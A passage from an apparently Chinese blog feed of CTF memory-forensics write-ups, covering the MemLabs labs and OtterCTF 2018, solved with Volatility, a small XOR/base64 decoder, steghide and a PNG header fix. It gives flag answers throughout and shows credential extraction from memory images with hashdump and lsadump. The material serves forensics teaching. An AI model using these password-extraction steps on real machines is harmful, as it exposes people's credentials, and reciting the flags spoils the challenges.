中获取到的应⽤程序进⾏查看，filescan 看看有⽆什么说明，看样⼦第⼀个是系统应⽤</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202250849.png" alt="image-20230726202250849"></p><p>第⼆个呢？这个貌似有点意思，但⽬前可不考虑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202400862.png" alt="image-20230726202400862"></p><p>5)那么我们再进⼀步获取 executable params (可执⾏程序执⾏参数)也就是调⽤插件 cmdline 其中发现了，⼀个 Python 脚本，⼀个 txt 都⽐较奇怪</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202352905.png" alt="image-20230726202352905"></p><p>搞下来看看，先拿下 filepath</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202604540.png" alt="image-20230726202604540"></p><p>⼩技巧：有时候 dump 下来因为⽂件名关系，我们⽆法直接分辨⽂件类型，可直接使⽤ file 查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202804373.png" alt="image-20230726202804373"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202841017.png" alt="image-20230726202841017"></p><p>6)查看后内容如下：</p><p>前者类似 base64 编码</p><p>后者则是⽤来 xor 编码前者的⽂件内容然后进⾏ base64 编码从⽽⽣成了 vip.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726203012625.png" alt="image-20230726203012625"></p><p>既然作者这样写，那么我们就写⼀个相反的 Python 程序，看看能否解码出来</p><p>我们⾸先要对 vip.txt 中的⽂本进⾏ base64 解码为： jmwex3m0\k7oe ，再进⾏ 3 次 XOR 运</p><p>算，最终拿到前半段 flag： inctf{0n3_h4lf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64rec <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"vip.txt"</span><span class="token punctuation">)</span>rec_base <span class="token operator">=</span> rec<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>rec_debase <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>rec_base<span class="token punctuation">)</span>tempbase <span class="token operator">=</span> <span class="token string">"jm`wex3m0\\k7oe"</span>\# <span class="token keyword">print</span><span class="token punctuation">(</span>rec_debase<span class="token punctuation">)</span>rec_res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tempbase<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">)</span>rec_res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>rec_res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7)那么还有后半段的 Flag，我们⼜去哪⼉找？我们题⽬中就然提⽰我们⽤ steghide ⼯具，⾃然涉及图⽚，我们可直接扫描内存中遗留的图⽚后缀，从⽽来提取线索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191355339.png" alt="image-20230728191355339"></p><p>其中的⽂件⽐较多，我将重定向到⼀个⽂件以保存，和更清楚简单的查看，经过漫⻓的操作，最终我们可以得到可疑⽂件如下：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191516475.png" alt="image-20230728191516475"></p><p>将其 dump 下来，然后查看，两个图⽚都没什么新奇，⼀个菊花，⼀个不知道啥</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191808756.png" alt="image-20230728191808756"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191817531.png" alt="image-20230728191817531"></p><p>8)⽤ steghide 提取⽂件，但是搞了半天密码却是错误的</p><p>最后也是考虑半天，既然必须要获取前半段 Flag，才能获取后半段 Flag，也即是说，前者可能就是后者的钥匙，我们试试⽤前半段 flag 当作密码来试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728192935997.png" alt="image-20230728192935997"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728193005091.png" alt="image-20230728193005091"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">inctf&#123;0n3_h4lf_1s_n0t_3n0ugh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-实站4"><a href="#5-实站4" class="headerlink" title="5.实站4"></a>5.实站4</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We <span class="token keyword">received</span> this <span class="token keyword">memory</span> dump <span class="token keyword">from</span> our client recently<span class="token punctuation">.</span> Someone accessed his system whenhe was <span class="token operator">not</span> there <span class="token operator">and</span> he found some rather strange files being accessed<span class="token punctuation">.</span> Find those files <span class="token operator">and</span> they might be useful<span class="token punctuation">.</span> I <span class="token keyword">quote</span> his exact statement <span class="token keyword">Also</span><span class="token punctuation">,</span> he noticed his most loved application that he always used crashed <span class="token keyword">every</span> <span class="token keyword">time</span> he ran it<span class="token punctuation">.</span>Was it a virus?Note-1<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> <span class="token number">3</span> flags<span class="token punctuation">.</span> <span class="token keyword">If</span> you think 2nd flag <span class="token keyword">is</span> the <span class="token keyword">end</span><span class="token punctuation">,</span> it isn't!! <span class="token punctuation">:</span>PNote-2<span class="token punctuation">:</span> There was a small mistake <span class="token keyword">when</span> making this challenge<span class="token punctuation">.</span> <span class="token keyword">If</span> you find <span class="token keyword">any</span> <span class="token keyword">string</span> whichhas the <span class="token keyword">string</span> <span class="token string">"L4B_3_D0n3!!"</span> <span class="token keyword">in</span> it<span class="token punctuation">,</span> please change it <span class="token keyword">to</span> <span class="token string">"**L4B_5_D0n3!!**"</span> <span class="token operator">and</span> <span class="token keyword">then</span> <span class="token keyword">proceed</span><span class="token punctuation">.</span>Note-3<span class="token punctuation">:</span> You'll get the stage <span class="token number">2</span> flag only <span class="token keyword">when</span> you have the stage <span class="token number">1</span> flag<span class="token punctuation">.</span>译⽂：我们最近从客⼾那⾥收到了这个内存转储。有⼈在他不在时访问了他的系统，他发现正在访问⼀些相当奇怪的⽂件。找到那些⽂件，它们可能会有⽤。我引⽤了他的确切陈述这些名字不可读。它们由字⺟和数字组成，但我⽆法弄清楚它到底是什么此外，他注意到他最喜欢的应⽤程序每次运⾏时都会崩溃。是病毒吗？Note-1：本次挑战由<span class="token number">3</span>个旗帜组成，如果你认为 2nd flag 是结束，那不是！Note-2：挑战时出现了⼀个⼩错误，如果您找到任何包含字符串 L4B_3_D0n3!! 的字符串在其中，请将其更改为 L4B_5_D0n3!! 然后继续解题Note-3：只有当您拥有 stage <span class="token number">1</span> 标志时，您才会获得 stage <span class="token number">2</span> 标志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">通过分析题⽬，我们⼤概总结如下：该内存取证中村⼦啊⼀个英⽂和数字组成的⽂件，且⽂件不可读其中我们需要注意字符串： L4B_3_D0n3!! 碰到了将其修改为 L4B_5_D0n3!!关键字病毒？喜欢的程序：具体是什么程序？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-4"><a href="#3-解题过程-4" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)解压： 7z e Challenge-5.7z</p><p>还是⽼样⼦，先分析框架：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728194356759.png" alt="image-20230728194356759"></p><p>2)然后分析 cmd 内的信息：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728194608603.png" alt="image-20230728194608603"></p><p>cmdline</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728194740250.png" alt="image-20230728194740250"></p><p>3)进⾏ filescan 定位到上⾯我们找到的⽂件：SW1wb3J0YW50.rar，进行提取</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728195020895.png" alt="image-20230728195020895"></p><p>4)尝试解压，发现要密码，但是我们没有打开它的密码。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728195109845.png" alt="image-20230728195109845"></p><p>提⽰说：RAR ⽂件中有 Stage2.png，我们去找 Stage 1 的密码,在⾛了⼏个死胡同之后，我尝试了 screenshots 插件，顾名思义，它允许我们看到在进⾏内存转储时,桌⾯上显⽰的内容，screenshots 实际上给出的是线框图，显⽰了所显⽰窗⼝的位置和标题，它不会向我们显⽰完整的窗⼝内容，但通常⾜以了解桌⾯上显⽰的内容。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728200634482.png" alt="image-20230728200634482"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728200653197.png" alt="image-20230728200653197"> </p><p>遍历查看后发现⼀个特殊字符串</p><p>ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ</p><p>Base64 解码后如下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728200852164.png" alt="image-20230728200852164"></p><p>5)Yes 获得了第⼀个 FLAG，题⽬在之前有提⽰</p><p>挑战时出现了⼀个⼩错误，如果您找到任何包含字符串 L4B_3_D0n3!! 的字符串在其中，请将其更改为 L4B_5_D0n3!! 然后继续解题</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使⽤ Flag 1 解压 SW1wb3J0YW50.rar 成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201110832.png" alt="image-20230728201110832"></p><p>得到 Flag 2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201155227.png" alt="image-20230728201155227"></p><p>6)题⽬说存在 3 个 FLAG 但是到这⾥，貌似没线索了，我们重新审题会发现他注意到他最喜欢的应⽤程序每次运⾏时都会崩溃。是病毒吗？</p><p>从这⾥切⼊，我们或许会获得 FLAG 3 ，但在这之前，我们尽量可检索所有 txt ⽂件，是否存在特殊的⽂件，因为我做过来⼤多数线索都在 txt 中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201504606.png" alt="image-20230728201504606"></p><p>但是搞了半天，没⽤，考虑到进程，我们操作 pslist 和 psxview 插件看看是否有可以进程这⾥有⼀个细节，我们可能第⼀次不会注意到，就是 NOTEPAD.exe 这个进程与其他的 NOTEPAD.exe 不⼀样，它被隐藏着</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201753748.png" alt="image-20230728201753748"></p><p>将其转存下来，然后操作 IDAPro64 打开上述程序</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201828335.png" alt="image-20230728201828335"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201849365.png" alt="image-20230728201849365"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Flag<span class="token punctuation">:</span> bi0s&#123;M3m_l4b5_OVeR_!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-实站5"><a href="#6-实站5" class="headerlink" title="6.实站5"></a>6.实站5</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We <span class="token keyword">received</span> this <span class="token keyword">memory</span> dump <span class="token keyword">from</span> the Intelligence Bureau Department<span class="token punctuation">.</span> They say this evidence might hold some secrets <span class="token keyword">of</span> the underworld gangster David Benjamin<span class="token punctuation">.</span> This <span class="token keyword">memory</span> dump was taken <span class="token keyword">from</span> one <span class="token keyword">of</span> his workers whom the FBI busted earlier this week<span class="token punctuation">.</span> Your job <span class="token keyword">is</span> <span class="token keyword">to</span> <span class="token keyword">go</span> <span class="token keyword">through</span> the <span class="token keyword">memory</span> dump <span class="token operator">and</span> see <span class="token keyword">if</span> you can figure something out<span class="token punctuation">.</span> FBI <span class="token keyword">also</span> says that David communicated <span class="token keyword">with</span> his workers via the internet so that might be a good place <span class="token keyword">to</span> <span class="token keyword">start</span><span class="token punctuation">.</span>Note<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> <span class="token number">1</span> flag split <span class="token keyword">into</span> <span class="token number">2</span> parts<span class="token punctuation">.</span>The flag format <span class="token keyword">for</span> this lab <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">*</span>inctf&#123;s0me_l33t_Str1ng&#125;译⽂我们从情报局部⻔收到了这个内存转储。他们说，这些证据可能掌握着⿊社会⼤佬⼤卫·本杰明的⼀些秘密。这个内存转储是从本周早些时候被联邦调查局逮捕的他的⼀名⼯⼈那⾥拿⾛的。你的⼯作是检查内存转储，看看你是否能找到⼀些东西。FBI 还表⽰，⼤卫通过互联⽹与他的员⼯进⾏交流，因此这可能是⼀个不错的起点<span class="token punctuation">.</span>Note：注意：此挑战由 <span class="token number">1</span> 个旗帜分成 <span class="token number">2</span> 个部分组成。本实验的标志格式为：inctf&#123;s0me_l33t_Str1ng&#125;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析-3"><a href="#2-题目分析-3" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">涉及 David Benjamin 这个⼈或者特殊字符串题⽬要求我们找⼀些东西，但具体却不知互联⽹：也就是说我们可能在浏览器历史中找到线索最后题⽬只有⼀个 Flag，但分为了两部分<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-5"><a href="#3-解题过程-5" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)先解压,然后分析所属系统平台与版本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728202951543.png" alt="image-20230728202951543"></p><p>2)扫 CMD 相关的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728202938616.png" alt="image-20230728202938616"></p><p>cmdscan 没有如何东西，我们使用cmdline，可以发现一个压缩包，我们进行提取</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194350846.png" alt="image-20230729194350846"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194752060.png" alt="image-20230729194752060"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194802332.png" alt="image-20230729194802332"></p><p>3)我们解压缩包2.rar，可以看到需要密码，操作解压发现要密码，提⽰ Flag2.png</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194823056.png" alt="image-20230729194823056"></p><p>回想实验 2，我使⽤ envars 插件列出了所有正在使⽤的环境变量，其中⼀个⽴即脱颖⽽出，就是压缩包密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195103288.png" alt="image-20230729195103288"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195453644.png" alt="image-20230729195453644"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195508077.png" alt="image-20230729195508077"></p><p>4)还有一个flag，我们根据题目内容，⼤卫通过互联⽹与他的员⼯进⾏交流我们想到浏览器，我们列出浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195909093.png" alt="image-20230729195909093"></p><p>我们可以看到2个浏览器，一个谷歌浏览器，一个firefox浏览器，我们一一列出来查看</p><p>不知道为什么这个上面列不出来，我们直接在kali上面使用volatility</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729201314628.png" alt="image-20230729201314628"></p><p>先获取 Chrome 的历史记录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729203930621.png" alt="image-20230729203930621"></p><p>数据过多，后续省略…，再获取 Firefox 的历史记录，但是没有获取到</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204024261.png" alt="image-20230729204024261"></p><p>我们着重分析 Chrome 浏览器的历史记录，可以发现其中有⼀个值得我们注意的地⽅</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204104089.png" alt="image-20230729204104089"></p><p>访问后是⼀个 Google⽂件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204147029.png" alt="image-20230729204147029"></p><p>细⼼收集后发现其中有⼀个超链接</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204202596.png" alt="image-20230729204202596"></p><p>5)访问后如下，需要密钥</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204220930.png" alt="image-20230729204220930"></p><p>这⾥有⼀个⼩技巧：如果我们要在内存映像中找寻特殊字符串，可直接：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings <span class="token operator">&lt;</span>memory_name<span class="token operator">></span> | grep <span class="token operator">&lt;</span>what_you_want_to_find?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6)找到了 KEY:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">THE <span class="token keyword">KEY</span> <span class="token keyword">IS</span> zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204330694.png" alt="image-20230729204330694"></p><p>提取⽂件，是⼀个 png ⽂件，但在 Windows 中⽆法打开，由此我们可以判断是⽂件有问题，要么是⽂件头，要么是特殊⽂件，扔到 010Editor ⾥⾯分析</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204404565.png" alt="image-20230729204404565"></p><p>⼀眼就可以看出来，IHDR ，其中的 i 变为了小写，将其转换为大写如:IHDR ，修复后得到 Flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204441028.png" alt="image-20230729204441028"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-介绍&quot;&gt;&lt;a href=&quot;#一-介绍&quot; class=&quot;headerlink&quot; title=&quot;一.介绍&quot;&gt;&lt;/a&gt;一.介绍&lt;/h1&gt;&lt;h2 id=&quot;1-内存取证-Memory-forensics&quot;&gt;&lt;a href=&quot;#1-内存取证-Memory-forensic</summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="内存取证" scheme="http://ms02423.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>OtterCTF-2018-General</title>
    <link href="http://ms02423.top/2023/07/20/OtterCTF-2018-General/"/>
    <id>http://ms02423.top/2023/07/20/OtterCTF-2018-General/</id>
    <published>2023-07-20T11:01:32.000Z</published>
    <updated>2023-08-03T08:03:19.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-General-Info"><a href="#一-General-Info" class="headerlink" title="一.General Info"></a>一.General Info</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Let<span class="token string">'s start easy - whats the PC'</span>s name <span class="token operator">and</span> IP <span class="token keyword">address</span>?答案使用<span class="token operator">-</span>连接加上flag&#123;&#125;格式提交，例如PC名为<span class="token keyword">test</span>，IP为<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，提交flag&#123;test-127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 注册表</p><p>1)根据题目，我们知道需要电脑的名称和ip地址</p><p>首先我们获取操作系统——imageinfo</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720190755805.png" alt="image-20230720190755805"></p><p>2)想要知道电脑ip我们可以使用——netscan</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720190957503.png" alt="image-20230720190957503"></p><p>3)电脑名称我们使用——envars，这样查看太麻烦了，我们把文件导出来，然后进行搜索computername</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720191133613.png" alt="image-20230720191133613"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720191600627.png" alt="image-20230720191600627"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;WIN-LO6FAF3DTFE-192<span class="token punctuation">.</span><span class="token number">168.202</span><span class="token number">.131</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-OtterCTF-2018-What-the-password"><a href="#二-OtterCTF-2018-What-the-password" class="headerlink" title="二.[OtterCTF 2018]What the password?"></a>二.[OtterCTF 2018]What the password?</h1><pre class="line-numbers language-none"><code class="language-none">you got a sample of rick&#39;s PC&#39;s memory. can you get his user password?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点：mimakatz</p><p>1)我们知道需要电脑的密码，我们使用——hashdump</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192455951.png" alt="image-20230720192455951"></p><p>2)使用lsadump进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192523557.png" alt="image-20230720192523557"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;MortyIsReallyAnOtter&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三-OtterCTF-2018-Play-Time"><a href="#三-OtterCTF-2018-Play-Time" class="headerlink" title="三.[OtterCTF 2018]Play Time"></a>三.[OtterCTF 2018]Play Time</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rick <span class="token keyword">just</span> loves <span class="token keyword">to</span> play some good old videogames<span class="token punctuation">.</span> can you tell which game <span class="token keyword">is</span> he playing? whats the IP <span class="token keyword">address</span> <span class="token keyword">of</span> the server?答案使用<span class="token operator">-</span>连接加上flag&#123;&#125;格式提交，例如游戏名为<span class="token keyword">test</span>，IP为<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，提交flag&#123;test-127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>考点:进程分析</p><p>1)我们使用pstree进行分析，经过百度搜索搜索知道LunarMS是游戏</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192916444.png" alt="image-20230720192916444"></p><p>2)查找游戏ip地址我们使用网络连接——netscan，grep进行筛选</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720193226483.png" alt="image-20230720193226483"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;LunarMS-77<span class="token punctuation">.</span><span class="token number">102.199</span><span class="token number">.102</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="四-OtterCTF-2018-Silly-Rick"><a href="#四-OtterCTF-2018-Silly-Rick" class="headerlink" title="四.[OtterCTF 2018]Silly Rick"></a>四.[OtterCTF 2018]Silly Rick</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Silly rick always forgets his email<span class="token string">'s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick'</span>s email <span class="token keyword">password</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:剪贴板</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720194150763.png" alt="image-20230720194150763"></p><p>我们直接输入命令clipboard即可看到邮箱</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720194327329.png" alt="image-20230720194327329"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;M@il_Pr0vid0rs&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="五-OtterCTF-2018-Name-Game"><a href="#五-OtterCTF-2018-Name-Game" class="headerlink" title="五.[OtterCTF 2018]Name Game"></a>五.[OtterCTF 2018]Name Game</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We know that the account was logged <span class="token keyword">in</span> <span class="token keyword">to</span> a <span class="token keyword">channel</span> called Lunar-3<span class="token punctuation">.</span> what <span class="token keyword">is</span> the account name?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:提取进程,使用strings进行二进制转字符串</p><p>1)我们直接进行筛选 Lunar-3，但是只有2个 Lunar-3，这里我们使用strings</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195155765.png" alt="image-20230720195155765"></p><p>2)前面我们知道游戏进行是708，我们使用memdump提取进程</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195422226.png" alt="image-20230720195422226"></p><p>3)提取之后，708.dump是一个二进制文件，我们用strings转换为字符strings &#x2F;home&#x2F;kali&#x2F;volatility_2.6_lin64_standalone&#x2F;708.dmp &gt; &#x2F;home&#x2F;kali&#x2F;708.dmp.strings   </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195436689.png" alt="image-20230720195436689"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195929445.png" alt="image-20230720195929445"></p><p>4)我们使用strings进行搜索,这里我的环境有点问题，我又重新导出了一遍708.dmp.strings</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">grep<span class="token punctuation">:</span> 是一个用于在文件中搜索指定文本模式的命令。-C <span class="token number">10</span><span class="token punctuation">:</span> 这个选项是`grep`的上下文参数，表示在输出结果中显示匹配行的上下文内容，上下各<span class="token number">10</span>行。也就是说，除了显示包含<span class="token string">"Lunar-3"</span>的行之外，还会显示前后各<span class="token number">10</span>行的内容，以便更好地理解匹配的上下文。Lunar-3"<span class="token punctuation">:</span> 是要在文件中搜索的目标字符串，即搜索的文本模式。<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>桌面<span class="token operator">/</span><span class="token number">708</span><span class="token punctuation">.</span>dmp<span class="token punctuation">.</span>strings<span class="token punctuation">:</span> 是要进行搜索的文件路径。在这个例子中，搜索的文件是位于`<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>桌面<span class="token operator">/</span>`目录下的名为`<span class="token number">708</span><span class="token punctuation">.</span>dmp<span class="token punctuation">.</span>strings`的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201337973.png" alt="image-20230720201337973"></p><p>5)我们还可以直接在镜像里面进行搜索，这里加两个参数，可以打印出目标字符串前后的信息。</p><p>-A&lt;显示行数&gt; 或 –after-context&#x3D;&lt;显示行数&gt; : 除了显示符合范本样式的那一列之外，并显示该行之后的内容。<br>-B&lt;显示行数&gt; 或 –before-context&#x3D;&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前的内容。<br>我这里把两个对应Lunar-3前后五行的数据也打印出来了。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201015190.png" alt="image-20230720201015190"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;0tt3r8r33z3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六-OtterCTF-2018-Hide-And-Seek"><a href="#六-OtterCTF-2018-Hide-And-Seek" class="headerlink" title="六.[OtterCTF 2018]Hide And Seek"></a>六.[OtterCTF 2018]Hide And Seek</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">The reason that we took rick's PC <span class="token keyword">memory</span> dump <span class="token keyword">is</span> because there was a malware infection<span class="token punctuation">.</span> Please find the malware <span class="token keyword">process</span> name <span class="token punctuation">(</span>including the extension<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:恶意软件进程——pstree pslist</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201638316.png" alt="image-20230720201638316"></p><p>1)通过pstree模块，我们可以看到各个进程直接的父子关系</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202038512.png" alt="image-20230720202038512"></p><p>2)可以看到，看似无害的vmware-tray.exe进程，他的父进程是Rick And Morty.exe，这是非常不对劲的，可以怀疑这个vmware-tray.exe进程实际上是恶意软件释放出来的子进程,通过<code>cmdline</code>模块，可以追踪到程序的调用指令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202339089.png" alt="image-20230720202339089"></p><p>3)我们也可以百度一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202413110.png" alt="image-20230720202413110"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;vmware-tray<span class="token punctuation">.</span>exe&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="七-OtterCTF-2018-Name-Game-2"><a href="#七-OtterCTF-2018-Name-Game-2" class="headerlink" title="七.[OtterCTF 2018]Name Game 2"></a>七.[OtterCTF 2018]Name Game 2</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">From</span> a little research we found that the username <span class="token keyword">of</span> the logged <span class="token keyword">on</span> <span class="token keyword">character</span> <span class="token keyword">is</span> always <span class="token 